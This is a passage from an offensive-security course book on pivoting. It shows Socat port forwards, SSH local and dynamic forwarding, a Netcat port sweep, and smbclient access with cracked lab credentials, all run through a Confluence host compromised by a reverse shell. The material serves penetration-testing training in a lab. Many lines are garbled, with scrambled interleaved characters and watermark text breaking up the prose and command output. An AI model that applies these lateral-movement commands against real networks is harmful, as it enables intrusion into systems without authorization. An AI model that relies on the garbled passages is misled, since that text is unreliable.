+Imrtdapinp_uaptdeemasrisnotufhsaectrrtsah.cekipnags, swHoarsdhcpaotlicryeftourrnthsispCaosnsfwluoerndWcsheitifnloosrwtatnhcee  isn't very strong.  After only a  few
+                                                                                                                               database_admin,      hr_admin     and
+
+We might suspect that these  passwords     anreeJtewrfefourrsekey, dwien'lol tfhinedr  places throughout the network. After
+some more enumeration of     the internal                                              PGDATABASE01 is also running an
+
+SwmFiSerasHccth,asiwnenreecvretneorea.PeLtedGetDat'soAptTkorAyirltlBthtfAhoeSerswEeo0arc1ridrg.einodOaneSln-CSt5iO7ao7lNcs5aF2at1Lg9pUa0rEionNcsCetsEtsh0i1slisSttheSanHtinwsgeilrlovanelrloT. wWCPiuthspootorutrS2nS3eH4w5d.piroWerctet'fllylortfwhroeanmrdcionruegarstKekailalli,
+
+new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on
+
+PGDATABASE01.
+
+confluence@confluence01:/opt/atlassian/confluence/bin$ <cu>socat TCP-LISTEN:2222,fork
+TCP:10.4.50.215:22</cu>
+</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+
+     Listing 575 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.
+
+With our new Socat port forward set up, our network setup will be configured much like the
+following diagram:
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                         620
+                                                                               Penetration Testing with Kali Linux
+
+Figure 261: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01
+
+There are only very minimal differences between this and the previous network setup. Instead of
+listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on
+PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.
+
+We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are
+connecting directly to port 22 on PGDATABASE01. We can use the database_admin user, and the
+password we just cracked using Hashcat.
+
+kali@kali:~$ <cu>ssh database_admin@192.168.50.63 -p2222</cu>
+
+WATeTEhhDahsroister2en5astabsyi51lonk.ueiug9tshy:eshkeenPuiestrdyire.cfmniyoaionttnyuegnkeonwtrapfloynrwnihtnoasttdbyodteisd'ac[on'1nyS9[tHo2A1i9nt.2u152h6.e6e8r1:3.6cn8To5Rn.a0nC5m.6e01eJcs.3Zew]6tfti3:fn]l2rQ:2gee22y2(x2y2LWeT2(hi[Ss't0/1l94(nohoE2wD/.V3[12fZ65M8i5nb1.Fg59ne)0.r3pt06olr3Y]iFt:nh2tu2Q]e)2VQ?l2iH)sj<'Utcuqcola>yYfne'ztsJkon<o.b/ecwnu>
+dW*ea**tlaScDMuoaobcnmpaepausmoger_eetnaomtdet:amnUitbtun:i@nont1:u922.1hh0h6t.ttttt80p.p4p.s5ss40:::.///6L///uT3hlO'abeSSnuls-pdn(5pt.Gs77cuuNa5s.Uba2spuc/1eLwno9it.mo0nucr/adu.adc:xnoovmn5ai.nt4c.aa0gle.-c1o2m2-generic x86_64)
+
+System information as of Thu 18 Aug 2022 11:43:07 AM UTC
+
+System load: 0.1             Processes:                                   241
+Usage of /: 59.3% of 7.77GB
+Memory usage: 16%            Users logged in:                             1
+Swap usage: 0%
+                             IPv4 address for ens192: 10.4.50.215
+
+                             IPv4 address for ens224: 172.16.50.215
+
+0 updates can be applied immediately.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your
+Internet connection or proxy settings
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                            621
+                                                                          Penetration Testing with Kali Linux
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+database_admin@pgdatabase01:~$
+          Listing 576 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.
+
+Success! The database_admin credentials have been reused here. We have managed to connect
+to the SSH server on PGDATABASE01 using the credentials for database_admin we found in the
+PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.
+
+In this Learning Unit, we created some simple port forwards using Socat. These allowed us to
+gain deeper access within a network by leveraging our existing access to a compromised host.
+
+It should also be noted that Socat is not the only way to create port forwards on *NIX hosts.
+There are several alternatives, of note:
+
+� rinetd is an option that runs as a daemon. This makes it a better solution for longer-term port
+      forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
+
+� We can combine Netcat and a FIFO named pipe file to create a port forward.
+
+� If we have root privileges, we could use iptables to create port forwards. The specific
+      iptables port forwarding setup for a given host will likely depend on the configuration already
+      in place. To be able to forward packets in Linux also requires enabling forwarding on the
+      /inptreorcfa/scyesw/neewt/aipnvt4t/ocfoonrfw/[ainrdteorfnacbey]/wforirtwinagrd"1in" gtoW(hifititl'sownot already configured to allow it).
+
+1T렁� h9is.3LULUeensaaSedrrennSSriSsntHhHtgaenUltofdnuucintatnhdlc,enaodmpveyreneolrainssnmttaaghilncsed, orfceoOfomSlSlon-So5wsHt7eoi7n,t5fgua2unn1Lsn9dei0neargleriJnnmsegifsnofhgtrueOetydtblyejencatmiveicsp: ort forwarding methods
+
+At a high level, tunneling describes the act of encapsulating one kind of data stream within
+another as it travels across a network. Certain protocols called tunneling protocols are designed
+specifically to do this. Secure Shell (SSH) is an example of one of these protocols.
+
+SSH was initially developed to give administrators the ability to log in to their servers remotely
+through an encrypted connection. Before SSH, tools such as rsh, _rlogin_, and Telnet provided
+similar remote administration capabilities, but over an unencrypted connection.
+
+In the background of each SSH connection, all shell commands, passwords, and data are
+transported through an encrypted tunnel built using the SSH protocol. The SSH protocol is
+primarily a tunneling protocol, allowing almost any kind of data to pass through an SSH
+connection. For that reason, tunneling capabilities are built into most SSH tools.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  622
+                                                                          Penetration Testing with Kali Linux
+
+Another advantage of SSH tunneling is its ability to blend into normal network traffic. Network
+administrators frequently use SSH for legitimate remote administration and flexible port
+forwarding in restrictive environments. It's therefore common to find SSH client software already
+installed on Linux hosts, or even SSH servers running there. It's also increasingly common to find
+OpenSSH client software installed on Windows hosts. In network environments that are not
+heavily monitored, SSH traffic will not seem anomalous, and SSH traffic will look much like
+regular administrative traffic. Its contents cannot be easily monitored.
+
+In most official documentation, tunneling data through an SSH connection is referred to as SSH
+port forwarding. Different SSH software will provide slightly different port forwarding capabilities.
+We will cover all common SSH port forwarding types offered by OpenSSH in this Learning Unit.
+
+SSH port forwarding can be a hugely powerful tool in any network situation, but it can also be a
+very useful option for attackers working in restrictive network environments.
+
+19.3.1 SSH local port forwarding
+
+Let's recall the first port forwarding example from the Socat scenario. We set up Socat to listen
+on TCP port 2345 on the WAN interface of CONFLUENCE01. Packets it received on that port were
+forwarded to TCP port 5432 on PGDATABASE01. We used this to connect from our Kali machine,
+through CONFLUENCE01, to the PostgreSQL service on PGDATABASE01. The crucial thing to
+notice in this case is that listening and forwarding were both done from the same host
+(CONFLUENCE01).
+
+SSH local port forwarding adds a small twist to this. With SSH local port forwarding, packets are
+
+banTTexnoehhptdteiswefpareoicaleerlocwnnpkncaatecewrctedsksopeeeatdhttrstoemibnsrtyegithgscetuheh(nptaievfnaesosdeSrlaoweSmocmaHnaerldctphahelioobiedsrssntbttptrfyoaaothtrncrhtwatdeataairSlnreindsSit.ttSHieauSJnlnslHeysnef.erfsfvloWreeeerdrrevyptteohaWrcr)chtao,hiknauteeglltisshuosow.nttecdIhnnkeesierntSstegtwSaapHdeno,dscratponiientscnSoibefSpyecHe.tttinoecenrodtnbobnyyethtcgheteieotStnSiSnSHigsHsmsceolriaevmdeneert.,
+CdLCeaOOttNN'asbFFraLLesUUceoEE,nNNasCCnidEEde00rt11ht..ehWreeepisrsetvsiiltolilulhsanvosOecSfei-arn5ella7w7rtiha5ole2l1wp9cir0rteehvdaeennsttliiinagglhstuwmseofrdpoirfmeicvaicotoiuonsnnl:yeSccotricnaacgtktiesodntfhoreolompnogtrehtsre
+                                                                                                                                                                                                                                            available on
+                                                                                                                                                                                                                                            Confluence
+                                                                                                                                                                                                                                            we bind on
+
+With the database_admin credentials, we'll log in to PGDATABASE01 and find that it's attached to
+another internal subnet. We find a host with a Server Message Block (SMB) server open (on TCP
+port 445) in that subnet. We want to be able to connect to that server and download what we find
+to our Kali machine.
+
+      Info
+     Server Message Block (SMB) is a network protocol used primarily for sharing files,
+     printers, and other resources between computers on a local network, especially in
+     Windows environments.
+
+In this type of scenario, we'll plan to create an SSH local port forward as part of our SSH
+connection from CONFLUENCE01 to PGDATABASE01. We will bind a listening port on the WAN
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                    623
+                                                                                                                              Penetration Testing with Kali Linux
+
+interface of CONFLUENCE01. All packets sent to that port will be forwarded through the SSH
+tunnel. PGDATABASE01 will then forward these packets toward the SMB port on the new host we
+found.
+The following diagram illustrates our setup:
+
+                  Figure 262: How we want our SSH local port forward to work in the lab, at a high level
+
+In this diagram, we listen on TCP port 4455 on CONFLUENCE01. Packets sent to that port are
+pushed by the SSH client software on CONFLUENCE01 through the SSH tunnel. At the other end
+of the tunnel, the SSH server software on PGDATABASE01 forwards them to TCP port 445 on the
+newly found host.
+
+Let's set up our lab environment up just like this. A VM group for following along is provided at the
+
+bottom of   this  section.   shell  on  CONFLUENCE01  uWshinigtltohwe     cURL  one-liner       exploit   for  CVE-2022-
+As before,  we    can get a
+
+26134. We can     no longer use Socat to  JcHerfoefawrteeeyvear,          port forward    that  allows us to SSH into
+PGDATABASE01      from our Kali machine.                                   in this case,   we   can SSH directly from
+CONFLUENCE01      to PGDATABASE01.
+
+We  cncreaeenad'ttetcotrhekeantopeowtrhteefxoaSrcwStlaHyrdwloShciSacHlhOpSIcoP-or5nta7ndf7oe5dr2crwe1ti9sao0srnd,alnjeudts'stpSoyeSrttH.wWienhtwoeanPnGsteDtthAteiTnpAgaBucApkSeaEtns01fSoStrowHsaltoradcretadel nptouo.mrtSeofroabrtweinfaogrr.de,
+we
+we
+
+In our shell from CONFLUENCE01, we'll make sure we have TTY functionality by using the Python
+
+3's pty module.
+
+We now initiate an SSH connection to PGDATABASE01 using the database_admin credentials,
+establishing access for further enumeration.
+
+confluence@confluence01:/opt/atlassian/confluence/bin$ <cu>python3 -c 'import pty;
+pty.spawn("/bin/sh")'</cu>
+</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+$ <cu>ssh database_admin@10.4.50.215</cu>
+<sian/confluence/bin$ ssh database_admin@10.4.50.215
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '10.4.50.215 (10.4.50.215)' can't be established.
+ECDSA key fingerprint is SHA256:K9x2nuKxQIb/YJtyN/YmDBVQ8Kyky7tEqieIyt1ytH4.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                       624
+                                                                               Penetration Testing with Kali Linux
+
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+database_admin@10.4.50.215's password:
+
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)
+
+* Documentation: https://help.ubuntu.com
+
+* Management:  https://landscape.canonical.com
+
+* Support:     https://ubuntu.com/advantage
+
+System information as of Thu 18 Aug 2022 03:01:09 PM UTC
+
+System load: 0.0             Processes:                                   241
+Usage of /: 59.4% of 7.77GB
+Memory usage: 16%            Users logged in:                             2
+Swap usage: 0%
+                             IPv4 address for ens192: 10.4.50.215
+
+                             IPv4 address for ens224: 172.16.50.215
+
+0 updates can be applied immediately.
+
+Last login: Thu Aug 18 11:43:08 2022 from 10.4.50.63
+database_admin@pgdatabase01:~$
+
+        Listing 577 - Giving our reverse shell TTY functionality with Python3's pty, and logging into PGDATABASE01 as
+                                                                   database_admin.
+
+Now that we have an SSH connection to PGDATABASE01 from CONFLUENCE01, we can start
+enumerating. We'll run ip addr to query available network interfaces.
+
+1d10:a0ta0llboi:ansk<e/_LlOaodOomPpBibAna@CcKpk,gdU0aP0,t:aL0bO0Wa:Es0eR0_0:1U0:P0>~:$0m0<t:cu0u06>5ip5b3rda6ddq00dr:<i0/s0cc:un0>Wo0hi:qtu0le0o:uw0e0s:t0a0te UNKNOWN group default qlen
+d2:efeaiiilnunnnislneee1tvvvkttt9aaa/6q2lll<1el:iii:tc2edddr7:h<n___>.e1Blllr0/1R1fff10.0Ottt.0020A84.0D0fff1:.Cooo5/5sArrrc008Seeeo.:Tvvvs5p2,eee16ceMrrr5o:U/8phLpppaoe2Trrr4s:Ieeet<6hCOfff/obASeee:csS-rrrtr9T5rrr>b,77eeelU5dddbobP2___rr,1lllLdd9fffO0tttf1Wf0EJfffR.:eooo4_ffrrrf.Ufeee5:Prvvv0f>eeee.fyrrr2m:ft55fu:fs15cfo0:0pfefqdglisocbalfqe_cnso1d9e2l state UP group
+
+       inet6 fe80::250:56ff:fe8a:6b9b/64 scope link
+            valid_lft forever preferred_lft forever
+
+3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group
+default qlen 1000
+
+       link/ether 00:50:56:8a:0d:b6 brd ff:ff:ff:ff:ff:ff
+       inet <cr>172.16.50.215/24</cr> brd 172.16.50.255 scope global ens224
+
+            valid_lft forever preferred_lft forever
+       inet6 fe80::250:56ff:fe8a:db6/64 scope link
+
+            valid_lft forever preferred_lft forever
+4: ens256: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen
+1000
+
+       link/ether 00:50:56:8a:f0:8e brd ff:ff:ff:ff:ff:ff
+                                    Listing 578 - Enumerating network interfaces on PGDATABASE01.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.       625
+                                                                                         Penetration Testing with Kali Linux
+
+We'll then run ip route to discover what subnets are already in the routing table.
+
+database_admin@pgdatabase01:~$ <cu>ip route</cu>
+10.4.50.0/24 dev ens192 proto kernel scope link src 10.4.50.215
+10.4.50.0/24 via 10.4.50.254 dev ens192 proto static
+<cr>172.16.50.0/24 dev ens224 proto kernel scope link src 172.16.50.215
+172.16.50.0/24 via 172.16.50.254 dev ens224 proto static</cr>
+
+                                      Listing 579 - Enumerating network routes on PGDATABASE01.
+
+We find that PGDATABASE01 is attached to another subnet, this time in the 172.16.50.0/24
+range. We don't find a port scanner installed on PGDATABASE01; however, we can still do some
+initial reconnaissance with the tools that are available.
+
+Let's write a Bash for loop to sweep for hosts with an open port 445 on the /24 subnet. We can
+use Netcat to make the connections, passing the -z flag to check for a listening port without
+sending data, -v for verbosity, and -w set to 1 to ensure a lower time-out threshold.
+
+database_admin@pgdatabase01:~$ <cu>for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i
+445; done</cu>
+< (seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
+nc: connect to 172.16.50.1 port 445 (tcp) timed out: Operation now in progress
+...
+nc: connect to 172.16.50.216 port 445 (tcp) failed: Connection refused
+<cr>Connection to 172.16.50.217 445 port [tcp/microsoft-ds] succeeded!</cr>
+nc: connect to 172.16.50.218 port 445 (tcp) timed out: Operation now in progress
+...
+database_admin@pgdatabase01:~$
+
+                   Listing 580 - Using a bash loop with Netcat to sweep for port 445 in the newly found subnet.
+
+MtishoaatshtPooGsfDttoAhnTeAtchBoeAnsSnueEbc0nt1ieot(n,awst h1tii7mc2he.1ho6au.s5t,0Ts.C2uP1g6gp)eoasrtctitn4ivg4e5tlyhoaprteeftWnuhh:sei1ert7edl2'ost.w1hn6eo.5tch0oi.nn2gn1e7tch!teioren..  In contrast, we'll notice
+                                                                                                                                                                                              We also find that there
+
+We want to   be able   to  oeunrumKaelri amteacthheinSeMfoBrJesinfesfrpvreeicycetioonn.  this host. If we find anything, we want                                                              to
+download it  directly  to                                                                There are at least two ways we could                                                                 do
+OtaChnOniyseNt.hFwiLnaUgy,EiNswCteEo0uw1s,oetuhlwednhahbtaaevcvekerttoboOuoSi-uldt5r-oi7nKw75atn2olli1oom9al0sdacwhietinfetion. dThPoiGsnDwPAGoTuDAlAdBTAcASreBEaA0tSe1,Eq0ut1hit.eenHaotwtreaednvioesufre,srifmwitaenbudaaicdl kdfainttoda
+
+transfer process.
+
+The alternative is to use SSH local port forwarding. We could create an SSH connection from
+CONFLUENCE01 to PGDATABASE01. As part of that connection, we could create an SSH local
+port forward. This would listen on port 4455 on the WAN interface of CONFLUENCE01,
+forwarding packets through the SSH tunnel out of PGDATABASE01 and directly to the SMB share
+we found. We could then connect to the listening port on CONFLUENCE01 directly from our Kali
+machine.
+
+      Info
+     In this scenario, there still is no firewall preventing us from accessing ports that we bind
+     on the WAN interface of CONFLUENCE01. In later sections, we will put the firewall up
+     and use more advanced techniques to traverse this boundary.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                      626
+                                                                                                                              Penetration Testing with Kali Linux
+
+For now, we should terminate our existing SSH connection to PGDATABASE01. We will then set
+up a new connection with new arguments to establish the SSH local port forward.
+
+A local port forward can be set up using OpenSSH's -L option, which takes a forwarding rule in the
+format:
+
+[LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT
+                                                  Listing 581 - Explaining OpenSSH's -L option
+
+� The first part (LOCAL_IP:LOCAL_PORT) defines the listening socket on the SSH client --
+      where packets will enter the tunnel.
+
+� The second part (DEST_IP:DEST_PORT) defines the destination socket on the SSH server
+      side -- where packets will be forwarded to after tunneling.
+
+The rest of the SSH command follows standard syntax, specifying the user and SSH server to
+connect to.
+
+In this case, we will instruct SSH to listen on all interfaces on port 4455 on CONFLUENCE01
+(0.0.0.0:4455), then forward all packets (through the SSH tunnel to PGDATABASE01) to port 445
+on the newly found host (172.16.50.217:445).
+
+      Info
+     We're listening on port 4455 on CONFLUENCE01 because we're running as the
+     confluence user: we don't have the permissions to listen on any port below 1024.
+
+Let's create the SSH connection from CONFLUENCE01 to PGDATABASE01 using ssh, logging in
+as database_admin. We'll pass the local port forwarding argument we just put together to -L, and
+<u0cCTo0o.hsu0e:nel4.f-a0l4dNu.5un0et5toohn::4tc1ep7ne4rt52c@e.5cirvceo:1eain61nf.t7tt25eyla.u0de1o.s6nfi2h.1creh75eello00:cfst4.1r:4t2oo5r/1mo'y7d:1pb0'4taet/4/.i4aha5nobt.g5lmdaaea0sotse./p_csa2ebiao1n5naadenmsfdli(e/J._cu1neoa0@efd.1nnf0mfc4ri..eleun4/5ye.@0.ns1.5Ws0c02hi..1het'4/52lb.1).oi'55wn0$c.a2<1n5c'<tu>/cbsuesh>es-tNab-lLished.
+AydFECaraetDseialSyAbeoadkuseetosy_uaardfdmiedinngy@otehu1r0ep.wra4hionn.5ttst0.its2ot1ocS5o'HtAhsnOe2tS5ip-l6na5:siu77ssKe5w9t2xco1oo2r9nndf0un:eKkxncQtowIinnb/gYhoJ(tysyetsNs//(Ynmo/hD/o[BfVmQie8/nKgceoynrkfyp7lriutEentqnc]i)eeI/?.yytse1sysht/kH4n.own_hosts).
+
+                                           Listing 582 - Running the local port forward command.
+
+Once we've entered the password, we don't receive any output. When running SSH with the -N
+flag, this is normal. The -N flag prevents SSH from executing any remote commands, meaning we
+will only receive output related to our port forward.
+
+      Info
+     If the SSH connection or the port forwarding fails for some reason, and the output we
+     get from the standard SSH session isn't sufficient to troubleshoot it, we can pass the -v
+     flag to ssh in order to receive debug output.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  627
+                                                                                        Penetration Testing with Kali Linux
+
+Since this reverse shell from CONFLUENCE01 is now occupied with an open SSH session, we
+need to catch another reverse shell from CONFLUENCE01. We can do this by listening on another
+port and modifying our CVE-2022-26134 payload to return a shell to that port.
+
+Once we have another reverse shell from CONFLUENCE01, we can confirm that the ssh process
+we just started from our other shell is listening on 4455 using ss.
+
+confluence@confluence01:/opt/atlassian/confluence/bin$ <cu>ss -ntplu</cu>
+
+ss -ntplu
+
+Netid State Recv-Q Send-Q            Local Address:Port                                 Peer Address:Port
+
+Process
+
+udp UNCONN 0        0                127.0.0.53%lo:53                                   0.0.0.0:*
+
+<cr>tcp LISTEN 0         128                                              0.0.0.0:4455    0.0.0.0:*
+
+users:(("ssh",pid=59288,fd=4))</cr>
+
+tcp LISTEN 0        4096             127.0.0.53%lo:53                                   0.0.0.0:*
+
+tcp LISTEN 0        128              0.0.0.0:22                                         0.0.0.0:*
+
+tcp LISTEN 0        128                                                   [::]:22         [::]:*
+
+tcp LISTEN 0        10                                                    *:8090          *:*
+
+users:(("java",pid=1020,fd=44))
+
+tcp LISTEN 0        1024                                                  *:8091          *:*
+
+users:(("java",pid=1311,fd=15))
+
+tcp LISTEN 0        1            [::ffff:127.0.0.1]:8000                                  *:*
+
+users:(("java",pid=1020,fd=76))
+
+                    Listing 583 - Port 4455 listening on all interfaces on CONFLUENCE01.
+
+It is - great! Connecting to port 4455 on CONFLUENCE01 will now be just like connecting directly
+to port 445 on 172.16.50.217. We can review the connection flow in the following diagram.
+
+                                                            Whitlow
+                                                 Jeffrey
+                                  OS-57752190
+
+           Figure 263: The SSH local port forward set up, with the command running on CONFLUENCE01
+
+From our Kali machine, we now have direct access to port 4455 on CONFLUENCE01. Let's start
+by listing the available shares with smbclient's -L option, passing 4455 to the custom port -p
+option, along with the username to the -U option and the password to the --password option. We'll
+try the credentials we cracked for the hr_admin user from the Confluence database.
+
+kali@kali:~$ <cu>smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --
+password=Welcome1234</cu>
+
+         Sharename  Type         Comment
+         ---------  ----         -------
+         ADMIN$     Disk         Remote Admin
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                   628
+                                                                          Penetration Testing with Kali Linux
+
+    C$               Disk  Default share
+
+    IPC$             IPC   Remote IPC
+
+    <cr>scripts            Disk</cr>
+
+    Users            Disk
+
+Reconnecting with SMB1 for workgroup listing.
+
+do_connect: Connection to 192.168.50.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
+
+Unable to connect with SMB1 -- no workgroup available
+
+    Listing 584 - Listing SMB shares through the SSH local port forward running on CONFLUENCE01.
+
+We find a share called scripts, which we will likely be able to access. Let's try to list what's inside
+it and download what we find.
+
+kali@kali:~$ <cu>smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --
+
+password=Welcome1234</cu>
+
+Try "help" to get a list of possible commands.
+
+smb: \> <cu>ls</cu>
+
+.                                     D                                   0 Thu Aug 18 22:21:24 2022
+
+..                                    DR                                  0 Thu Aug 18 19:42:49 2022
+
+Provisioning.ps1                      A   387 Thu Aug 18 22:21:52 2022
+
+README.txt                            A   145 Thu Aug 18 22:22:40 2022
+
+            5319935 blocks of size 4096. 152141 blocks available
+
+smb: \> <cu>get Provisioning.ps1</cu>
+getting file \Provisioning.ps1 of size 387 as Provisioning.ps1 (0.6 KiloBytes/sec)
+(average 0.6 KiloBytes/sec)
+
+smb: \>
+
+Listing 585 - Listing files in the scripts share, using smbclient over our SSH local port forward running on CONFLUENCE01.
+
+To1LIarnaonh9fptcleiylhi.aed3diol,slo.dnap2sweteoeesnrcsrtplatooiilftocaoemkndre,lweoaStwdvcapSeekrfedmiiHlnuerinegstcgnuedadtdnyn.hinrnSaenesScalo,tHmwomanlcbaoieOcckecSeiagn-ipsnll5gassop7rpi7ofirtnr5ertoltg2cefm1tfsoeo9lsi0mdrrowfwudliJetarieaarxrfetadirifbcotidrntltneaelgiy:yncftkowogoWnremhaeiocacntucaclgroehnaKwsignaoseelnima.lmynWeanichnctoitslheneirinnnneeevfac.foletlSvctMitonivgBeo,mnstehhuailsstrieopmclaekenestdhteoerpvdxeifcrmiletSsraaSpotHser
+
+connection. This can make it quite tedious to use at scale. Luckily, OpenSSH also provides
+dynamic port forwarding. From a single listening port on the SSH client, packets can be forwarded
+to any socket that the SSH server host has access to.
+
+SSH dynamic port forwarding works because the listening port that the SSH client creates is a
+SOCKS proxy server port. SOCKS is a proxying protocol. Much like a postal service, a SOCKS
+server accepts packets (with a SOCKS protocol header) and forwards them on to wherever
+they're addressed.
+
+      Info
+     The forwarding behavior here isn't automatic or "magic" --it works because client tools
+     like Proxychains wrap outbound connections in SOCKS protocol headers. These headers
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                              629
+                                                                                                                              Penetration Testing with Kali Linux
+
+     tell the SOCKS server (in this case, OpenSSH) where to send the traffic. Without them,
+     the server can't forward the packets correctly.
+
+This is powerful. In SSH dynamic port forwarding packets can be sent to a single listening SOCKS
+port on the SSH client machine. These will be pushed through the SSH connection, then
+forwarded to anywhere the SSH server machine can route. The only limitation is that the packets
+must be properly formatted - most often by SOCK-compatible client software. In some cases,
+software is not SOCKS-compatible by default. We will work through this limitation later in this
+section.
+
+Let's illustrate an SSH dynamic port forward in our network diagram.
+
+                                               Figure 264: The SSH dynamic port forward setup
+
+WtThhrAeoNulagiyhnottuehtrefiasScSveeHroytfusnCimnOeiNllatFroLtPUoGESNDSCAHTEl0Ao1Bc.aAlPSpaEoc0rk1te,fttoshrewsneafnrodtriWnwthogai.rttWdlheoiesdw awproehreltirse(tivenenriSntOhgeCoyKnaSTreCfoaPrdmpdoarertt)ss9ae9rde9.9pounshtehde
+HawLcTanehoatnyiwn'ssstoemeettvohxneetedbraer,ennptpsdoaaocbtwtrkhalteeeekottewsponraiiedlnaldvonsvtihoytaaieulnlfostucbtahloselgercperareeobnohcrltaftoeOsrSSstcith-otOoa5i.sntC7Aah7Kfocas5lefSct2wxeH1Ppise9bRGrs0loilSlDitattJHoAhysec,AeTfcowRfASolrEBeMnfeSoAnynBr.SeemEcept0adoin1tr.tgtohotaeonsntHshaueRcrcSeSeHMtshAsBaRttpEoowS, r,htthbaorutnoetuvHwegRrehSsctHohafAintswRasEalsiSrneo,gwwlaeececpaueolsssroest.
+
+We can ensure that we're in a TTY shell using Python3's pty module. We will create our SSH
+connection to PGDATABASE01 using the database_admin credentials again. In OpenSSH, a
+dynamic port forward is created with the -D option. The only argument this takes is the IP address
+and port we want to bind to. In this case, we want it to listen on all interfaces on port 9999. We
+don't have to specify a socket address to forward to. We'll also pass the -N flag to prevent a shell
+from being spawned.
+
+confluence@confluence01:/opt/atlassian/confluence/bin$ <cu>python3 -c 'import pty;
+pty.spawn("/bin/sh")'</cu>
+</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+$ <cu>ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215</cu>
+<$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+Could not create directory '/home/confluence/.ssh'.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  630
+                                                                          Penetration Testing with Kali Linux
+
+The authenticity of host '10.4.50.215 (10.4.50.215)' can't be established.
+ECDSA key fingerprint is SHA256:K9x2nuKxQIb/YJtyN/YmDBVQ8Kyky7tEqieIyt1ytH4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <cu>yes</cu>
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+database_admin@10.4.50.215's password:
+
+                                    Listing 586 - Opening the SSH dynamic port forward on port 9999.
+
+As with the previous example, we don't receive any immediate output after we enter the
+password.
+
+      Info
+     As before, if we wanted to manually confirm that port 9999 is listening on
+     CONFLUENCE01, we would exploit the Confluence vulnerability again to get another
+     reverse shell (since our existing shell is tied up with the SSH port forward command),
+     then run ss in that shell.
+
+As we did earlier, let's connect to port 445 on HRSHARES. However, this time we will do it through
+the SOCKS proxy port created by our SSH dynamic port forward command.
+
+To accomplish this, we'll want to use smbclient again. However, we find that smbclient doesn't
+natively provide an option to use a SOCKS proxy. Without a native option to use a SOCKS proxy in
+smbclient, we can't take advantage of our dynamic port forward. The SOCKS proxy can't
+determine how to handle traffic that isn't encapsulated in the SOCKS protocol format.
+
+To use smbclient in this situation, we'll leverage Proxychains. Proxychains is a tool that can force
+network traffic from third party tools over HTTP or SOCKS proxies. As the name suggests, it can
+saLtelsoto'rsepptmTbdetaeherciyrsgebIhfcnshyoPnwofetroridndmaqonfeyuxoitfgoseytaPuicuwmr(irthLoleotaaDpxdraniyl_knettcdPsofhn/RofewaeporEttiurincLewtcshs/OveohpesAwsrrrtkomDyraoatxol)rhlbfykptfOciccsonieSoclhgir-ihensaao5onbnti7vanitoue7oe.skclt5rniP4g2twsali.r1ihocb.oi9ctlnoIcxl0thhsnwynwaafcJooei.choenvtrWkfanwkeof.i'retnoffrItotwesrchnkuryooeueismnnresWecgkcdheosouiossfnttruttnohrfalneideogscencywtuLtdtonairioipantnetinmrcfudtoisahgxipxlciuwlssiryaerohialstfllxaihiytn.lyire-ioknelisenntdteodkhfroeibveelbdeeinnbjrebsfai.ocniurTntraireaheprasriyrsil.temehtsmhlaooattaeshtadPtagniretneosvgtxesityrycthhainings,
+can locate our SOCKS proxy port and confirm that it's a SOCKS proxy (rather than any other kind
+of proxy). By default, proxies are defined at the end of the file. We can simply replace any existing
+proxy definition in that file with a single line defining the proxy type, IP address, and port of the
+SOCKS proxy running on CONFLUENCE01 (socks5 192.168.50.63 9999).
+
+      Info
+     Although we specify socks5 in this example, it could also be socks4, since SSH supports
+     both. SOCKS5 supports authentication, IPv6, and User Datagram Protocol (UDP),
+     including DNS. Some SOCKS proxies will only support the SOCKS4 protocol. Make sure
+     you check which version is supported by the SOCKS server when using SOCKS proxies
+     in engagements.
+
+After editing the file, it should appear as follows:
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  631
+                                                                                                                                                                                                                                                Penetration Testing with Kali Linux
+
+kali@kali:~$ <cu>tail /etc/proxychains4.conf</cu>
+
+#  proxy types: http, socks4, socks5, raw
+
+#  * raw: The traffic is simply forwarded to the proxy without modification.
+
+#  ( auth types supported: "basic"-http "user/pass"-socks )
+
+#
+
